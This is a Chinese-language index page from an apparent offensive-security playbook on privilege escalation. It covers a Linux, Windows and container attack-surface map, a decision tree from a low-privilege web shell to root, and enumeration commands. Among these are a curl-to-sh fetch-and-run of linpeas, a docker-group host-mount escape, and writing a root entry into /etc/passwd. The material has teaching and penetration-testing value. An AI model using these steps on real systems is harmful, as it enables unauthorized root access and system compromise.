# Privilege Escalation — 权限提升攻击全景与决策树

> 拿到低权限 shell（www-data/apache/nginx）只是开始。从受限服务账户到 root/SYSTEM 的路有两条：利用系统配置缺陷（SUDO/SUID/Cron/服务），或利用内核漏洞（CVE）。本指南提供系统化的 PE 决策路径与完整技术栈。

## 关键词

`提权` `特权提升` `privilege escalation` `PE` `SUID` `SGID` `SUDO滥用` `sudo` `Capabilities` `GTFOBins` `cron` `通配符注入` `PATH劫持` `DirtyPipe` `PwnKit` `DirtyCow` `OverlayFS` `CVE` `内核提权` `内核漏洞` `kernel exploit` `容器逃逸` `container escape` `docker` `Windows提权` `Potato` `JuicyPotato` `PrintSpoofer` `UAC绕过` `DLL劫持` `服务权限` `未引用路径` `AlwaysInstallElevated` `linpeas` `winpeas` `SeImpersonate`

## 攻击面全景

```
权限提升攻击面:
┌──────────────────────────────────────────────────────────────┐
│  Linux 配置滥用                                               │
│  ├─ SUDO 误配 (sudo -l → NOPASSWD/LD_PRELOAD/env_keep)      │
│  ├─ SUID/SGID 二进制 (find/vim/bash/python → GTFOBins)      │
│  ├─ Capabilities (cap_sys_admin/cap_dac_read_search/...)     │
│  ├─ Cron 任务劫持 (可写脚本/PATH 劫持/通配符注入)            │
│  ├─ 服务文件篡改 (可写 .service → systemctl)                 │
│  ├─ NFS no_root_squash                                       │
│  └─ Library/LD_PRELOAD 劫持                                   │
├──────────────────────────────────────────────────────────────┤
│  Linux 内核漏洞                                                │
│  ├─ DirtyPipe (CVE-2022-0847) — 任意文件覆写                  │
│  ├─ PwnKit (CVE-2021-4034) — pkexec 缓冲区溢出                │
│  ├─ DirtyCow (CVE-2016-5195) — COW 竞争条件                   │
│  ├─ OverlayFS (CVE-2021-3493/CVE-2023-0386/...)              │
│  ├─ Netfilter (CVE-2023-32233/CVE-2022-25636/...)            │
│  └─ 新 CVE: GameOver(lay)/StackRot/等                         │
├──────────────────────────────────────────────────────────────┤
│  Windows 提权                                                  │
│  ├─ Token 滥用 (SeImpersonate → Juicy/Rotten/PrintSpoofer)   │
│  ├─ 服务配置缺陷 (弱权限/未引用路径/AlwaysInstallElevated)    │
│  ├─ UAC 绕过 (fodhelper/computerdefaults/silentcleanup)      │
│  ├─ 计划任务劫持                                              │
│  ├─ DLL 劫持                                                  │
│  └─ 内核 CVE (MS16-032/CVE-2021-1732/...)                    │
├──────────────────────────────────────────────────────────────┤
│  容器逃逸                                                      │
│  ├─ Privileged 容器 (--privileged → 挂载 host /)              │
│  ├─ Docker socket (/var/run/docker.sock → docker run -v /:/)  │
│  ├─ Capabilities 滥用 (CAP_SYS_ADMIN → cgroup release_agent)  │
│  ├─ 内核漏洞共享 (宿主机内核 = 容器内核)                       │
│  └─ LXC/LXD 组 → lxc exec                                    │
└──────────────────────────────────────────────────────────────┘
```

## 文档索引

| 文档 | 内容 | 难度 |
|------|------|------|
| [01-linux-sudo-suid.md](01-linux-sudo-suid.md) | SUDO 滥用 + SUID/SGID + Capabilities + PATH | 基础→进阶 |
| [02-linux-cron-service.md](02-linux-cron-service.md) | Cron/服务/通配符注入/NFS/库劫持 | 进阶 |
| [03-linux-kernel-cve.md](03-linux-kernel-cve.md) | Linux 内核 CVE 利用方法论（全版本覆盖） | 高阶 |
| [04-windows-pe.md](04-windows-pe.md) | Windows 提权方法论（Token/服务/UAC/DLL） | 进阶 |
| [05-container-escape.md](05-container-escape.md) | 容器逃逸快速手册 | 进阶→高阶 |

## 核心决策树

```
拿到低权限 shell (www-data/apache/nginx/iusr):
│
├─ uname -a → 内核版本
│  ├─ 旧内核 (2.6~5.8) → [03] 大量已知 CVE 可用
│  ├─ 中版本 (5.8~6.2) → [03] DirtyPipe/PwnKit/OverlayFS 可试
│  └─ 新内核 (6.2+) → 重点走配置滥用路径 [01][02]
│
├─ id → 组成员
│  ├─ 在 docker 组 → [05] docker run -v /:/mnt → chroot
│  ├─ 在 lxd/lxc 组 → [05] lxc exec
│  └─ 无特殊组 → 继续
│
├─ sudo -l → SUDO 权限
│  ├─ (ALL) NOPASSWD: ALL → sudo su（直接提权，结束）
│  ├─ NOPASSWD → [01] 特定命令提权（GTFOBins 查）
│  ├─ env_keep → [01] LD_PRELOAD 注入
│  └─ 无 sudo 权限 → 继续
│
├─ find / -perm -4000 -type f 2>/dev/null → SUID
│  ├─ 发现异常 SUID → [01] GTFOBins 查利用
│  └─ 无异常 → 继续
│
├─ 信息收集 (linpeas.sh / pspy / 手动)
│  ├─ 可写 cron/service → [02] Cron/服务劫持
│  ├─ 内部服务 (127.0.0.1:*) → [02] 端口转发+服务利用
│  ├─ 可写 /etc/passwd → [02] 直接写 root 账户
│  └─ NFS 挂载 → [02] no_root_squash
│
├─ 容器环境?
│  ├─ .dockerenv 存在 → [05] 容器逃逸
│  ├─ /proc/1/cgroup 含 docker/kubepods → [05]
│  └─ 物理机 → 继续
│
└─ Windows?
   ├─ whoami /priv → SeImpersonate → [04] Potato 系列
   ├─ sc query → [04] 服务权限利用
   ├─ icacls → [04] 可写目录 → DLL/服务劫持
   └─ systeminfo → [04] 补丁对比 → 缺失的 CVE
```

## PE 两条路径对比

| 维度 | CVE 内核路径 | 配置滥用路径 |
|------|-------------|-------------|
| 依赖 | 内核版本/补丁级别 | 管理员配置错误 |
| 稳定性 | 低（可能内核 panic） | 高（正常功能利用） |
| 可重复性 | 补丁后失效 | 配置不改则永远可复现 |
| 隐蔽性 | 中（可能触发 audit/log） | 高（正常行为特征） |
| 优先度 | **先试配置，走不通再上 CVE** | 首选路线 |

## 信息收集速查

```bash
# ====== 一键收集 (优先使用自动化工具) ======
# linpeas: 最全面的 Linux PE 扫描
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# 或离线版
# 已有 linpeas.sh 上传到目标：bash linpeas.sh -a

# pspy: 无 root 权限监控进程（发现 cron/内部任务）
# pspy64 上传到目标: ./pspy64 -pf -i 1000

# ====== 手动快速探测 ======
id; whoami; hostname
uname -a; cat /etc/os-release; cat /proc/version
sudo -l 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.* 2>/dev/null
cat /etc/exports 2>/dev/null
ss -tlnp; netstat -tlnp 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v /proc
ls -la /var/run/docker.sock 2>/dev/null
cat /proc/1/cgroup 2>/dev/null
env; cat /etc/environment
```

## 关联技术

- [[00-overview]] — RCE 全景（如何拿到第一个 shell）
- [[05-chain-playbook]] — 漏洞→Shell 链（入口技术）
- [[kubernetes-container]] — 容器逃逸深度
- [[cve-workflow]] — CVE 工作流
- [[multi-cve-chain-playbook]] — 多 CVE 组合
